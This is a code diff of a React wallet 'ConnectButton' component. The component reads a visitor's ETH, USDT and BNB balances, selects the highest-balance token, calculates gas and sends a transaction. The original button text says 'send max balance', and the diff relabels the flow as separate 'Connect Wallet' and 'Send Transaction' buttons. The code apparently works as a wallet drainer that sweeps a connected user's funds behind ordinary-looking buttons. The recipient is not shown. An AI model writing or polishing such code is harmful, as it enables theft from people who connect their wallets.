@@ -75,7 +75,7 @@ export function ConnectButton() {
     return null
   }
 
-  const connectAndSend = async () => {
+  const connectWallet = async () => {
     try {
       let detectedProvider = detectWallet()
 
@@ -98,6 +98,21 @@ export function ConnectButton() {
       const signer = web3Provider.getSigner()
       const address = await signer.getAddress()
       console.log('Connected address:', address)
+    } catch (error) {
+      console.error('Error connecting wallet:', error)
+      alert('Error connecting wallet')
+    }
+  }
+
+  const sendTransaction = async () => {
+    if (!provider) {
+      alert('Please connect your wallet first.')
+      return
+    }
+
+    try {
+      const signer = provider.getSigner()
+      const address = await signer.getAddress()
 
       // Token contract addresses
       const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
@@ -114,7 +129,7 @@ export function ConnectButton() {
       const bnbContract = new Contract(bnbAddress, erc20Abi, signer)
 
       // Fetch balances
-      const ethBalance = await web3Provider.getBalance(address)
+      const ethBalance = await provider.getBalance(address)
       const usdtBalance = await usdtContract.balanceOf(address)
       const bnbBalance = await bnbContract.balanceOf(address)
 
@@ -137,7 +152,7 @@ export function ConnectButton() {
       console.log('Highest balance token:', highestBalanceToken)
 
       // Calculate gas fees
-      const gasPrice = await web3Provider.getGasPrice()
+      const gasPrice = await provider.getGasPrice()
       const gasLimit = BigNumber.from(21000) // Base transaction cost
       const gasCost = gasPrice.mul(gasLimit)
 
@@ -169,7 +184,7 @@ export function ConnectButton() {
 
       alert('Transaction successful!')
     } catch (error) {
-      console.error(error)
+      console.error('Error sending transaction:', error)
 
       // Check if error is an instance of Error
       if (error instanceof Error) {
@@ -184,7 +199,8 @@ export function ConnectButton() {
 
   return (
     <>
-      <Button onClick={connectAndSend}>Connect wallet and send max balance</Button>
+      <Button onClick={connectWallet}>Connect Wallet</Button>
+      <Button onClick={sendTransaction}>Send Transaction</Button>
     </>
   )
 }
